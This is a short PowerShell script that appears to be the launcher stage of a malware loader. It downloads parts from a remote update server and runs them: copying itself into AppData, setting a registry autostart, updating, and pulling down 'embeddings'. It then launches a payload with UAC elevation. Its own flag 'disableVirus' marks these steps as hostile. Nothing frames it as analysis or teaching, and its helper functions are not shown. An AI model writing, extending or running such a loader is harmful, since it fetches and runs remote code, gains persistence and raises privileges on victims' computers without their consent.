. ./consts_holder_parts.ps1
. ./utils.ps1


$cmd=@"
    DoBody_InitialExtract

    if (-not `$server.disableVirus)
    {
        DoHolder_AppData
    }
"@
RunRemoteAsync -baseUrl $server.updateUrlParts -part "autocopy" -cmd $cmd

$cmd=@"
    if (-not `$server.disableVirus)
    {
        DoHolder_RegistryAuoStart
    }
"@
RunRemoteAsync -baseUrl $server.updateUrlParts -part "autoregistry" -cmd $cmd

$cmd=@"
    DoUpdate
"@
if (-not $server.disableVirus) {
    RunRemoteAsync -baseUrl $server.updateUrlParts -part "update" -cmd $cmd
}

while ($true) {
    try 
    {
        if (Test-Path -Path (Get-BodyPath)) {
            RunMe -script (Get-BodyPath) -arg "guimode" -uac $false

            if (-not $server.disableVirus) 
            {
                RunMe -script (Get-BodyPath) -arg "" -uac $true
            }

            break;
        }
    } 
    catch 
    {
    }
    Start-Sleep -Seconds 1
}


$cmd=@"
    DoFront
    DoEmbeddings
"@
RunRemote -baseUrl $server.updateUrlParts -part "embeddings" -waitForFinish $true -inJob $false -cmd $cmd
